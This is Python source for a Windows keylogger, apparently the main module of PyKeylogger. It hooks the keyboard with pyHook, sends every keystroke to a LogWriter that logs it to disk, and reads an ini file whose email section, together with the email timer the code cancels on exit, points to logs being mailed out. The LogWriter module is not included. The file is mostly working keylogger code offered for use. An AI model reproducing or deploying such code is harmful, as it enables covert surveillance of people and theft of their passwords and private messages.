import pyHook
import time
import pythoncom
import sys
from optparse import OptionParser
import traceback
from logwriter import LogWriter
import version
import ConfigParser

class KeyLogger:
    ''' Captures all keystrokes, calls LogWriter class to log them to disk
    '''
    def __init__(self): 
        
        self.ParseOptions()
        self.ParseConfigFile()
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if self.settings['hookkeyboard'] == 'True':
            self.hm.HookKeyboard()
        #if self.options.hookMouse == True:
        #    self.hm.HookMouse()
        
        self.lw = LogWriter(self.settings) 

    def start(self):
        pythoncom.PumpMessages()


    def OnKeyboardEvent(self, event):
        '''This function is the stuff that's supposed to happen when a key is pressed.
        Calls LogWriter.WriteToLogFile with the keystroke properties.
        '''
        
        self.lw.WriteToLogFile(event)
        
        if event.Key == self.settings['exitkey']:
            self.stop()
            
        return True
    
    def stop(self):
        self.lw.flushtimer.cancel()
        self.lw.emailtimer.cancel()
        sys.exit()
    
    def ParseOptions(self):
        '''Read command line options
        '''
                
        parser = OptionParser(version=version.description + " version " + version.version + " (" + version.url + ").")
        #~ parser.add_option("-f", "--file", action="store", dest="dirName", help="write log data to DIRNAME [default: %default]")
        #~ parser.add_option("-k", "--keyboard", action="store_true", dest="hookKeyboard", help="log keyboard input [default: %default]")
        #~ parser.add_option("-a", "--addlinefeed", action="store_true", dest="addLineFeed", help="add linefeed [\\n] character when carriage return [\\r] character is detected (for Notepad compatibility) [default: %default]")
        #~ parser.add_option("-b", "--parsebackspace", action="store_true", dest="parseBackspace", help="translate backspace chacarter into printable string [default: %default]")
        #~ parser.add_option("-e", "--parseescape", action="store_true", dest="parseEscape", help="translate escape chacarter into printable string [default: %default]")

        #~ parser.add_option("-x", "--exitkey", action="store", dest="exitKey", help="specify the key to press to exit keylogger [default: %default]")
        #~ parser.add_option("-l", "--flushkey", action="store", dest="flushKey", help="specify the key to press to flush write buffer to file [default: %default]")
        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
        
        #~ parser.add_option("-n", "--nolog", action="append", dest="noLog", help="specify an application by full path name whose input will not be logged. repeat option for multiple applications. [default: %default]")
        #~ parser.add_option("-o", "--onefile", action="store", dest="oneFile", help="log all output to one file ONEFILE, (inside DIRNAME, as specified with -f option), rather than to multiple files. [default: %default]")

        #~ parser.add_option("-s", "--systemlog", action="store", dest="systemLog", help="log all output, plus some debug output, to a SYSTEMLOG file (inside DIRNAME, as specified with -f option). [default: %default]")

        #parser.add_option("-r", "--raw", action="store", dest="raw", help="log events in raw mode (pickle event objects with all their attributes). [default: %default]")

        #~ parser.add_option("-i", "--interval", action="store", dest="interval", type="float", help="specify the time interval between buffer autoflush events, in seconds. [default: %default]")
        
        parser.add_option("-c", "--configfile", action="store", dest="configfile", help="filename of the configuration ini file. [default: %default]")
        
        #~ parser.set_defaults(dirName=r"C:\Temp\logdir",
                            #~ hookKeyboard=True,
                            #~ addLineFeed=False,
                            #~ parseBackspace=False,
                            #~ parseEscape=False,
                            #~ exitKey='F12',
                            #~ flushKey='F11',
                            #~ debug=False,
                            #~ noLog=None,
                            #~ oneFile=None,
                            #~ interval=120.0,
                            #~ systemLog=None)
        parser.set_defaults(debug=False, configfile="pykeylogger.ini")

        (self.options, args) = parser.parse_args()
    
    def ParseConfigFile(self):
        '''Read config file options
        '''
        #~ defaults = {"dirName":r"C:\Temp\logdir",
            #~ "hookKeyboard":"True",
            #~ "addLineFeed":"False",
            #~ "parseBackspace":"False",
            #~ "parseEscape":"False",
            #~ "exitKey":"F12",
            #~ "flushKey":"F11",
            #~ "debug":"False",
            #~ "noLog":"None",
            #~ "oneFile":"None",
            #~ "flushInterval":"120.0",
            #~ "emailInterval":"240"
            #~ "systemLog":"None"}

        self.config = ConfigParser.SafeConfigParser()
        self.config.readfp(open(self.options.configfile))
        
        self.settings = dict(self.config.items('general'))
        self.settings.update(dict(self.config.items('email')))
        #~ print self.settings
        #~ print str(self.options)
        #~ print type(dict(str(self.options)))
        self.settings.update(self.options.__dict__)
        #print self.settings
                    
if __name__ == '__main__':
    kl = KeyLogger()
    #print kl.options
    kl.start()
    
    #if you want to change keylogger behavior from defaults, run it with commandline options. try '-h' for list of options.
    